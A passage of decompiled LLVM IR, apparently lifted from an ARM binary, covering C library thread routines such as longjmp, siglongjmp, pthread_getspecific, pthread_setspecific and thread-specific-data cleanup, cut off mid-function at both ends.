  br label %dec_label_pc_f8cc

dec_label_pc_f8cc:                                ; preds = %bb, %bb17, %dec_label_pc_f8a8, %dec_label_pc_f8bc
  %v0_f8cc = phi i32 [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %bb17 ], [ ptrtoint (i32* @global_var_2b0c0 to i32), %bb ], [ %v1_f8a8, %dec_label_pc_f8a8 ], [ %v1_f8c8, %dec_label_pc_f8bc ]
  %v1_f8cc = add i32 %v0_f8cc, 60
  %storemerge.in3 = inttoptr i32 %v1_f8cc to i32*
  %storemerge4 = load i32, i32* %storemerge.in3, align 4
  store i32 %storemerge4, i32* %r4.global-to-local, align 4
  %v2_f8ec6 = icmp eq i32 %storemerge4, 0
  br i1 %v2_f8ec6, label %dec_label_pc_f900, label %dec_label_pc_f8f4

dec_label_pc_f8d4:                                ; preds = %dec_label_pc_f8f4
  %v1_f8d4 = load i32, i32* %r6.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_f8dc, %v1_f8d4
  br i1 %tmp, label %dec_label_pc_f8dc, label %dec_label_pc_f8b4

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f8d4
  %v1_f8dc = add i32 %v0_f8dc, 4
  %v2_f8dc = inttoptr i32 %v1_f8dc to i32*
  %v3_f8dc = load i32, i32* %v2_f8dc, align 4
  store i32 %v3_f8dc, i32* @r0, align 4
  %v1_f8e4 = inttoptr i32 %v0_f8dc to i32*
  %v2_f8e4 = load i32, i32* %v1_f8e4, align 4
  call void @__pseudo_branch(i32 %v2_f8e4)
  %v0_f8e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f8e8 = add i32 %v0_f8e8, 12
  %storemerge.in = inttoptr i32 %v1_f8e8 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_f8ec = icmp eq i32 %storemerge, 0
  br i1 %v2_f8ec, label %dec_label_pc_f900, label %dec_label_pc_f8f4

dec_label_pc_f8f4:                                ; preds = %dec_label_pc_f8cc, %dec_label_pc_f8dc
  %v0_f8dc = phi i32 [ %storemerge, %dec_label_pc_f8dc ], [ %storemerge4, %dec_label_pc_f8cc ]
  %v0_f8f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f8f4 = add i32 %v0_f8f4, 32
  %v2_f8f4 = inttoptr i32 %v1_f8f4 to i32*
  %v3_f8f4 = load i32, i32* %v2_f8f4, align 4
  %v3_f8f8 = icmp ult i32 %v0_f8dc, %v3_f8f4
  br i1 %v3_f8f8, label %dec_label_pc_f8d4, label %dec_label_pc_f900

dec_label_pc_f900:                                ; preds = %dec_label_pc_f8f4, %dec_label_pc_f8dc, %dec_label_pc_f8cc, %dec_label_pc_f8b4
  %v0_f908 = phi i32 [ 0, %dec_label_pc_f8b4 ], [ 0, %dec_label_pc_f8cc ], [ %v0_f8dc, %dec_label_pc_f8f4 ], [ 0, %dec_label_pc_f8dc ]
  %v0_f900 = load i32, i32* %r5.global-to-local, align 4
  %v1_f900 = add i32 %v0_f900, 84
  %v2_f900 = inttoptr i32 %v1_f900 to i32*
  %v3_f900 = load i32, i32* %v2_f900, align 4
  store i32 %v3_f900, i32* %r2.global-to-local, align 4
  %v2_f904 = icmp eq i32 %v3_f900, 0
  %v2_f908 = add i32 %v0_f900, 60
  %v3_f908 = inttoptr i32 %v2_f908 to i32*
  store i32 %v0_f908, i32* %v3_f908, align 4
  br i1 %v2_f904, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_f900
  %v3_f90c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_f90c, i32* @r4, align 4
  %v18_f90c = load i32, i32* @r0, align 4
  ret i32 %v18_f90c

bb19:                                             ; preds = %dec_label_pc_f900
  %v0_f910 = load i32, i32* %r7.global-to-local, align 4
  %v1_f910 = add i32 %v0_f910, 32
  %v2_f910 = inttoptr i32 %v1_f910 to i32*
  %v3_f910 = load i32, i32* %v2_f910, align 4
  %v0_f914 = load i32, i32* %r2.global-to-local, align 4
  %v3_f914 = icmp ult i32 %v0_f914, %v3_f910
  br i1 %v3_f914, label %bb20, label %.thread2

bb20:                                             ; preds = %bb19
  %v2_f91c = load i32, i32* %r5.global-to-local, align 4
  %v3_f91c = add i32 %v2_f91c, 84
  %v4_f91c = inttoptr i32 %v3_f91c to i32*
  store i32 0, i32* %v4_f91c, align 4
  br label %.thread2

.thread2:                                         ; preds = %bb19, %bb20
  %v2_f920 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f920, i32* @r4, align 4
  %v17_f920 = load i32, i32* @r0, align 4
  ret i32 %v17_f920

; uselistorder directives
  uselistorder i32 %v0_f8dc, { 1, 4, 0, 2, 3 }
  uselistorder i32* %stack_var_-20, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32 -480, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_f8f4, { 1, 0 }
  uselistorder label %dec_label_pc_f8cc, { 3, 2, 1, 0 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f944 = call i32 @pthread_cleanup_upto()
  %v0_f948 = load i32, i32* @r4, align 4
  %v0_f94c = load i32, i32* @r5, align 4
  %v2_f950 = call i32 @_longjmp(i32 %v0_f948, i32 %v0_f94c)
  ret i32 %v2_f950
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f95c = call i32 @pthread_cleanup_upto()
  %v0_f960 = load i32, i32* @r4, align 4
  %v0_f964 = load i32, i32* @r5, align 4
  %v2_f968 = call i32 @_longjmp(i32 %v0_f960, i32 %v0_f964)
  ret i32 %v2_f968

; uselistorder directives
  uselistorder i32 (i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 ()* @pthread_cleanup_upto, { 1, 0 }
}

define i32 @_thread_self.12() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_f970 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_f974 = load i32, i32* @sp, align 4
  %v3_f974 = icmp ult i32 %v0_f974, %v2_f970
  %v1_f978 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f978, i32* @r1, align 4
  br i1 %v3_f974, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_f994, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2b0c0 to i32), %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_f994 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_f988 = load i32, i32* @global_var_2be50.182, align 4
  %v3_f98c = icmp ult i32 %v0_f974, %v2_f988
  br i1 %v3_f98c, label %bb4, label %dec_label_pc_f994

dec_label_pc_f994:                                ; preds = %bb3
  %v2_f998 = load i32, i32* @global_var_2be54.184, align 4
  %v3_f99c = icmp ult i32 %v0_f974, %v2_f998
  br i1 %v3_f99c, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_f994, %bb3
  %v2_f9ac = load i32, i32* @global_var_30238.188, align 4
  store i32 %v2_f9ac, i32* @r2, align 4
  %v3_f9b0 = and i32 %v1_f978, -2097152
  %v4_f9b0 = xor i32 %v3_f9b0, -2097152
  %v2_f9b8 = icmp eq i32 %v2_f9ac, 0
  %v1_f9bc = sub i32 -477, %v4_f9b0
  br i1 %v2_f9b8, label %dec_label_pc_f9c8, label %dec_label_pc_f9c4

dec_label_pc_f9c4:                                ; preds = %bb4
  %v1_f9c4 = call i32 @__pthread_find_self(i32 %v1_f9bc)
  br label %dec_label_pc_f9c8

dec_label_pc_f9c8:                                ; preds = %bb4, %dec_label_pc_f9c4
  %v0_f9c8 = phi i32 [ %v1_f9bc, %bb4 ], [ %v1_f9c4, %dec_label_pc_f9c4 ]
  %v1_f9c8 = add i32 %v0_f9c8, -3
  ret i32 %v1_f9c8

; uselistorder directives
  uselistorder i32 %v1_f9bc, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_find_self, { 5, 0, 10, 4, 9, 3, 2, 8, 7, 6, 1 }
  uselistorder i32* @global_var_30238.188, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* @global_var_2be54.184, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 16, 1, 2, 11, 12, 13, 14, 15 }
  uselistorder i32* @global_var_2be50.182, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 16, 1, 11, 12, 13, 14, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_2b2a0.186 to i32), { 1, 0, 13, 2, 3, 4, 5, 12, 14, 6, 7, 8, 9, 11, 15, 16, 10 }
  uselistorder i32 ptrtoint (i32* @global_var_2b0c0 to i32), { 2, 0, 12, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11 }
  uselistorder i32* @global_var_2be4c.179, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder label %dec_label_pc_f9c8, { 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v0_f9f0 = call i32 @_thread_self.12()
  %v4_f9f4 = mul i32 %arg1, 4
  %v5_f9f4 = add i32 %v0_f9f0, 364
  %v1_f9f8 = add i32 %v5_f9f4, %v4_f9f4
  ret i32 %v1_f9f8
}

define i32 @__pthread_internal_tsd_get(i32 %arg1) local_unnamed_addr {
entry:
  %v0_fa08 = call i32 @_thread_self.12()
  %v4_fa0c = mul i32 %arg1, 4
  %v5_fa0c = add i32 %v4_fa0c, %v0_fa08
  %v1_fa10 = add i32 %v5_fa0c, 364
  %v2_fa10 = inttoptr i32 %v1_fa10 to i32*
  %v3_fa10 = load i32, i32* %v2_fa10, align 4
  ret i32 %v3_fa10
}

define i32 @__pthread_internal_tsd_set() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_fa18 = load i32, i32* @r4, align 4
  store i32 %v3_fa18, i32* %stack_var_-12, align 4
  %v0_fa1c = load i32, i32* @r0, align 4
  %v0_fa20 = load i32, i32* @r1, align 4
  %v0_fa24 = call i32 @_thread_self.12()
  %v4_fa28 = mul i32 %v0_fa1c, 4
  %v5_fa28 = add i32 %v0_fa24, 364
  %v2_fa2c = add i32 %v5_fa28, %v4_fa28
  %v3_fa2c = inttoptr i32 %v2_fa2c to i32*
  store i32 %v0_fa20, i32* %v3_fa2c, align 4
  %v2_fa34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fa34, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 0, 2, 1 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_fa38 = icmp ugt i32 %arg1, 1023
  %v3_fa3c = load i32, i32* @r4, align 4
  store i32 %v3_fa3c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v2_fa38, label %.thread, label %dec_label_pc_fa48

dec_label_pc_fa48:                                ; preds = %entry
  %v0_fa48 = call i32 @_thread_self.12()
  %v0_fa4c = load i32, i32* %r4.global-to-local, align 4
  %v3_fa4c = udiv i32 %v0_fa4c, 32
  %v4_fa50 = mul nuw nsw i32 %v3_fa4c, 4
  %v5_fa50 = add i32 %v4_fa50, %v0_fa48
  %v1_fa54 = add i32 %v5_fa50, 236
  %v2_fa54 = inttoptr i32 %v1_fa54 to i32*
  %v3_fa54 = load i32, i32* %v2_fa54, align 4
  %v2_fa58 = icmp eq i32 %v3_fa54, 0
  br i1 %v2_fa58, label %.thread, label %dec_label_pc_fa60

dec_label_pc_fa60:                                ; preds = %dec_label_pc_fa48
  %v4_fa64 = mul i32 %v0_fa4c, 8
  %v5_fa64 = add i32 %v4_fa64, ptrtoint (i32* @global_var_2be90.530 to i32)
  %v6_fa64 = inttoptr i32 %v5_fa64 to i32*
  %v7_fa64 = load i32, i32* %v6_fa64, align 4
  %v2_fa6c = icmp eq i32 %v7_fa64, 0
  br i1 %v2_fa6c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_fa60
  %v1_fa68 = urem i32 %v0_fa4c, 32
  %v5_fa70 = mul nuw nsw i32 %v1_fa68, 4
  %v6_fa70 = add i32 %v3_fa54, %v5_fa70
  %v7_fa70 = inttoptr i32 %v6_fa70 to i32*
  %v8_fa70 = load i32, i32* %v7_fa70, align 4
  %v3_fa74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_fa74, i32* %r4.global-to-local, align 4
  ret i32 %v8_fa70

.thread:                                          ; preds = %dec_label_pc_fa60, %dec_label_pc_fa48, %entry
  %v2_fa7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa7c, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_fa4c, { 0, 2, 1 }
}

define i32 @__pthread_destroy_specifics(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_fa84 = load i32, i32* @r4, align 4
  store i32 %v3_fa84, i32* %stack_var_-20, align 4
  %v9_fa84 = load i32, i32* @r6, align 4
  %v0_fa88 = call i32 @_thread_self.12()
  store i32 0, i32* @r7, align 4
  store i32 %v0_fa88, i32* @r6, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa9c.lr.ph

dec_label_pc_fa9c:                                ; preds = %dec_label_pc_fa9c.lr.ph, %dec_label_pc_fb00
  %v1_fa9c = phi i32 [ 0, %dec_label_pc_fa9c.lr.ph ], [ %v1_fb00, %dec_label_pc_fb00 ]
  %v0_fa9c = phi i32 [ %v0_fb2c35, %dec_label_pc_fa9c.lr.ph ], [ %v0_fa9c20, %dec_label_pc_fb00 ]
  %v8_fb1817 = phi i32 [ 0, %dec_label_pc_fa9c.lr.ph ], [ %v8_fb1816, %dec_label_pc_fb00 ]
  %v4_fa9c = mul i32 %v1_fa9c, 4
  %v5_fa9c = add i32 %v4_fa9c, %v0_fa9c
  %v1_faa0 = add i32 %v5_fa9c, 236
  %v2_faa0 = inttoptr i32 %v1_faa0 to i32*
  %v3_faa0 = load i32, i32* %v2_faa0, align 4
  %v2_faa4 = icmp eq i32 %v3_faa0, 0
  store i1 %v2_faa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faa4, label %dec_label_pc_fb00, label %dec_label_pc_fae8.preheader

dec_label_pc_fae8.preheader:                      ; preds = %dec_label_pc_fa9c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fab4:                                ; preds = %dec_label_pc_fae8
  %v4_faec = mul i32 %v1_faf4, 32
  %v5_faec = add i32 %v4_faec, %v2_fad4
  %v4_faf8 = mul i32 %v5_faec, 8
  %v4_faf4 = mul i32 %v1_faf4, 4
  %v5_faf4 = add i32 %v4_faf4, %v0_faf4
  %v1_fab4 = add i32 %v5_faf4, 236
  %v2_fab4 = inttoptr i32 %v1_fab4 to i32*
  %v3_fab4 = load i32, i32* %v2_fab4, align 4
  %v1_fab8 = add i32 %v4_faf8, add (i32 ptrtoint (i32* @global_var_2be90.530 to i32), i32 4)
  %v2_fab8 = inttoptr i32 %v1_fab8 to i32*
  %v3_fab8 = load i32, i32* %v2_fab8, align 4
  %v4_fabc = mul i32 %v2_fad4, 4
  %v5_fabc = add i32 %v3_fab4, %v4_fabc
  %v6_fabc = inttoptr i32 %v5_fabc to i32*
  %v2_fac0 = icmp eq i32 %v3_fab8, 0
  br i1 %v2_fac0, label %dec_label_pc_fad0, label %bb

bb:                                               ; preds = %dec_label_pc_fab4
  %v7_fabc = load i32, i32* %v6_fabc, align 4
  %v3_fac4 = icmp eq i32 %v7_fabc, 0
  br label %dec_label_pc_fad0

dec_label_pc_fad0:                                ; preds = %dec_label_pc_fab4, %bb
  %storemerge36 = phi i1 [ %v3_fac4, %bb ], [ %v2_fac0, %dec_label_pc_fab4 ]
  store i1 %storemerge36, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %v6_fabc, align 4
  call void @__pseudo_branch(i32 %v3_fab8)
  %v0_fae4 = load i32, i32* %r5.global-to-local, align 4
  %v1_fae4 = add i32 %v0_fae4, 1
  store i32 %v1_fae4, i32* %r5.global-to-local, align 4
  %v1_faec.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_faf4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %dec_label_pc_fae8.preheader, %dec_label_pc_fad0
  %v0_faf4 = phi i32 [ %v0_fa9c, %dec_label_pc_fae8.preheader ], [ %v0_faf4.pre, %dec_label_pc_fad0 ]
  %v1_faf4 = phi i32 [ %v1_fa9c, %dec_label_pc_fae8.preheader ], [ %v1_faec.pre, %dec_label_pc_fad0 ]
  %v2_fad4 = phi i32 [ 0, %dec_label_pc_fae8.preheader ], [ %v1_fae4, %dec_label_pc_fad0 ]
  %v8_fb1815 = phi i32 [ %v8_fb1817, %dec_label_pc_fae8.preheader ], [ 1, %dec_label_pc_fad0 ]
  %v7_faf0 = icmp eq i32 %v2_fad4, 31
  store i1 %v7_faf0, i1* %cpsr_z.global-to-local, align 1
  %v7_fafc = icmp sgt i32 %v2_fad4, 31
  br i1 %v7_fafc, label %dec_label_pc_fb00, label %dec_label_pc_fab4

dec_label_pc_fb00:                                ; preds = %dec_label_pc_fae8, %dec_label_pc_fa9c
  %v0_fb00 = phi i32 [ %v1_fa9c, %dec_label_pc_fa9c ], [ %v1_faf4, %dec_label_pc_fae8 ]
  %v0_fa9c20 = phi i32 [ %v0_fa9c, %dec_label_pc_fa9c ], [ %v0_faf4, %dec_label_pc_fae8 ]
  %v8_fb1816 = phi i32 [ %v8_fb1817, %dec_label_pc_fa9c ], [ %v8_fb1815, %dec_label_pc_fae8 ]
  %v1_fb00 = add i32 %v0_fb00, 1
  store i32 %v1_fb00, i32* %r4.global-to-local, align 4
  %v7_fb04 = icmp eq i32 %v1_fb00, 31
  store i1 %v7_fb04, i1* %cpsr_z.global-to-local, align 1
  %v7_fb08 = icmp slt i32 %v1_fb00, 32
  br i1 %v7_fb08, label %dec_label_pc_fa9c, label %dec_label_pc_fb0c

dec_label_pc_fa9c.lr.ph:                          ; preds = %entry, %dec_label_pc_fb0c
  %v0_fb2c35 = phi i32 [ %v0_fa88, %entry ], [ %v0_fa9c20, %dec_label_pc_fb0c ]
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa9c

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_fb00
  %v0_fb0c.pre = load i32, i32* @r7, align 4
  %v1_fb0c = add i32 %v0_fb0c.pre, 1
  store i32 %v1_fb0c, i32* @r7, align 4
  %v9_fb18 = urem i32 %v8_fb1816, 2
  %v2_fb1c37 = icmp eq i32 %v9_fb18, 0
  %not.v7_fb14 = icmp sgt i32 %v1_fb0c, 3
  %v2_fb1c = or i1 %v2_fb1c37, %not.v7_fb14
  store i1 %v2_fb1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb1c, label %dec_label_pc_fb2c, label %dec_label_pc_fa9c.lr.ph

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb0c
  %v1_fb2c = add i32 %v0_fa9c20, 28
  %v2_fb2c = inttoptr i32 %v1_fb2c to i32*
  %v3_fb2c = load i32, i32* %v2_fb2c, align 4
  %v2_fb34 = call i32 @__pthread_lock(i32 %v3_fb2c, i32 %v0_fa9c20)
  br label %dec_label_pc_fb54

dec_label_pc_fb3c:                                ; preds = %dec_label_pc_fb54
  %v1_fb3c = add i32 %v5_fb54, 236
  %v2_fb3c = inttoptr i32 %v1_fb3c to i32*
  %v3_fb3c = load i32, i32* %v2_fb3c, align 4
  store i32 %v3_fb3c, i32* @r0, align 4
  %v2_fb40 = icmp eq i32 %v3_fb3c, 0
  store i1 %v2_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb40, label %dec_label_pc_fb54, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fb3c
  %v0_fb48 = call i32 @free()
  %v1_fb50 = load i32, i32* @r5, align 4
  %v2_fb50 = add i32 %v1_fb50, 12
  %v3_fb50 = inttoptr i32 %v2_fb50 to i32*
  store i32 0, i32* %v3_fb50, align 4
  br label %dec_label_pc_fb54

dec_label_pc_fb54:                                ; preds = %dec_label_pc_fb3c, %dec_label_pc_fb48, %dec_label_pc_fb2c
  %v0_fb54 = load i32, i32* @r6, align 4
  %v1_fb54 = load i32, i32* @r4, align 4
  %v4_fb54 = mul i32 %v1_fb54, 4
  %v5_fb54 = add i32 %v4_fb54, %v0_fb54
  %v7_fb58 = icmp eq i32 %v1_fb54, 31
  store i1 %v7_fb58, i1* %cpsr_z.global-to-local, align 1
  %v1_fb5c = add i32 %v5_fb54, 224
  store i32 %v1_fb5c, i32* @r5, align 4
  %v1_fb60 = add i32 %v1_fb54, 1
  store i32 %v1_fb60, i32* @r4, align 4
  %v7_fb64 = icmp sgt i32 %v1_fb54, 31
  br i1 %v7_fb64, label %dec_label_pc_fb68, label %dec_label_pc_fb3c

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb54
  %v1_fb68 = add i32 %v0_fb54, 28
  %v2_fb68 = inttoptr i32 %v1_fb68 to i32*
  %v3_fb68 = load i32, i32* %v2_fb68, align 4
  %v2_fb6c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fb6c, i32* %r4.global-to-local, align 4
  store i32 %v9_fa84, i32* @r6, align 4
  %v1_fb70 = call i32 @__pthread_unlock(i32 %v3_fb68)
  %v0_fb74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fb74, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_fb68
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_fb68, %bb33
  ret i32 %v1_fb70

; uselistorder directives
  uselistorder i32 %v5_fb54, { 1, 0 }
  uselistorder i32 %v1_fb54, { 2, 0, 1, 3 }
  uselistorder i32 %v1_fb00, { 1, 2, 3, 0 }
  uselistorder i32 %v2_fad4, { 2, 1, 3, 0 }
  uselistorder i32 %v1_faf4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 5, 3, 7, 1, 6, 8, 0, 9, 2 }
  uselistorder i32 (i32)* @__pthread_unlock, { 48, 47, 46, 38, 37, 36, 35, 34, 33, 32, 31, 30, 2, 42, 51, 29, 28, 27, 26, 41, 25, 50, 24, 23, 22, 21, 20, 19, 18, 17, 16, 1, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 40, 6, 49, 5, 45, 44, 43, 3, 4, 39 }
  uselistorder i32 (i32, i32)* @__pthread_lock, { 2, 35, 34, 33, 32, 25, 24, 22, 1, 29, 23, 21, 20, 19, 18, 28, 16, 17, 15, 14, 13, 12, 0, 11, 10, 9, 7, 27, 6, 8, 5, 31, 30, 3, 4, 26 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_fb54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa9c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_fae8, { 1, 0 }
  uselistorder label %dec_label_pc_fad0, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v2_fb78 = icmp ugt i32 %arg1, 1023
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r8, align 4
  br i1 %v2_fb78, label %dec_label_pc_fbf0, label %dec_label_pc_fb8c

dec_label_pc_fb8c:                                ; preds = %entry
  %v4_fb90 = mul i32 %arg1, 8
  %v5_fb90 = add i32 %v4_fb90, ptrtoint (i32* @global_var_2be90.530 to i32)
  %v6_fb90 = inttoptr i32 %v5_fb90 to i32*
  %v7_fb90 = load i32, i32* %v6_fb90, align 4
  %v2_fb94 = icmp eq i32 %v7_fb90, 0
  %v3_fb98 = udiv i32 %arg1, 32
  store i32 %v3_fb98, i32* @r7, align 4
  br i1 %v2_fb94, label %dec_label_pc_fbf0, label %dec_label_pc_fba0

dec_label_pc_fba0:                                ; preds = %dec_label_pc_fb8c
  %v0_fba0 = call i32 @_thread_self.12()
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v0_fba0, i32* @r6, align 4
  %v0_fbac = load i32, i32* @r7, align 4
  %v3_fbac = mul i32 %v0_fbac, 4
  %v4_fbac = add i32 %v3_fbac, %v0_fba0
  %v1_fbb0 = add i32 %v4_fbac, 224
  store i32 %v1_fbb0, i32* @r5, align 4
  %v1_fbb4 = add i32 %v4_fbac, 236
  %v2_fbb4 = inttoptr i32 %v1_fbb4 to i32*
  %v3_fbb4 = load i32, i32* %v2_fbb4, align 4
  %v2_fbb8 = icmp eq i32 %v3_fbb4, 0
  br i1 %v2_fbb8, label %dec_label_pc_fbc4, label %dec_label_pc_fbd8

dec_label_pc_fbc4:                                ; preds = %dec_label_pc_fba0
  %v2_fbc4 = call i32 @calloc(i32 32, i32 4)
  %v2_fbc8 = icmp eq i32 %v2_fbc4, 0
  store i32 12, i32* %r1.global-to-local, align 4
  br i1 %v2_fbc8, label %dec_label_pc_fbf4, label %dec_label_pc_fbd4

dec_label_pc_fbd4:                                ; preds = %dec_label_pc_fbc4
  %v1_fbd4 = load i32, i32* @r5, align 4
  %v2_fbd4 = add i32 %v1_fbd4, 12
  %v3_fbd4 = inttoptr i32 %v2_fbd4 to i32*
  store i32 %v2_fbc4, i32* %v3_fbd4, align 4
  %v0_fbd8.pre = load i32, i32* @r6, align 4
  %v1_fbd8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fbd8

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fba0, %dec_label_pc_fbd4
  %v1_fbd8 = phi i32 [ %v0_fbac, %dec_label_pc_fba0 ], [ %v1_fbd8.pre, %dec_label_pc_fbd4 ]
  %v0_fbd8 = phi i32 [ %v0_fba0, %dec_label_pc_fba0 ], [ %v0_fbd8.pre, %dec_label_pc_fbd4 ]
  %v4_fbd8 = mul i32 %v1_fbd8, 4
  %v5_fbd8 = add i32 %v4_fbd8, %v0_fbd8
  %v1_fbdc = add i32 %v5_fbd8, 236
  %v2_fbdc = inttoptr i32 %v1_fbdc to i32*
  %v3_fbdc = load i32, i32* %v2_fbdc, align 4
  %v0_fbe0 = load i32, i32* @r4, align 4
  %v1_fbe0 = urem i32 %v0_fbe0, 32
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_fbe8 = load i32, i32* @r8, align 4
  %v5_fbe8 = mul nuw nsw i32 %v1_fbe0, 4
  %v6_fbe8 = add i32 %v5_fbe8, %v3_fbdc
  %v7_fbe8 = inttoptr i32 %v6_fbe8 to i32*
  store i32 %v0_fbe8, i32* %v7_fbe8, align 4
  %v0_fbf4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fbf4

dec_label_pc_fbf0:                                ; preds = %dec_label_pc_fb8c, %entry
  store i32 22, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fbf4

dec_label_pc_fbf4:                                ; preds = %dec_label_pc_fbc4, %dec_label_pc_fbd8, %dec_label_pc_fbf0
  %v0_fbf4 = phi i32 [ 12, %dec_label_pc_fbc4 ], [ %v0_fbf4.pre, %dec_label_pc_fbd8 ], [ 22, %dec_label_pc_fbf0 ]
  ret i32 %v0_fbf4

; uselistorder directives
  uselistorder i32 %v0_fba0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_fbf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fbd8, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 62768, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 64536, i32* %lr.global-to-local, align 4
  %v2_fc14 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2de90.535 to i32))
  %v0_fc18 = load i32, i32* @r4, align 4
  %v2_fc18 = icmp ugt i32 %v0_fc18, 1023
  br i1 %v2_fc18, label %dec_label_pc_fc30, label %dec_label_pc_fc20

dec_label_pc_fc20:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2be90.530 to i32), i32* %r1.global-to-local, align 4
  %v4_fc24 = mul i32 %v0_fc18, 8
  %v5_fc24 = add i32 %v4_fc24, ptrtoint (i32* @global_var_2be90.530 to i32)
  %v6_fc24 = inttoptr i32 %v5_fc24 to i32*
  %v7_fc24 = load i32, i32* %v6_fc24, align 4
  store i32 %v7_fc24, i32* %r3.global-to-local, align 4
  %v2_fc28 = icmp eq i32 %v7_fc24, 0
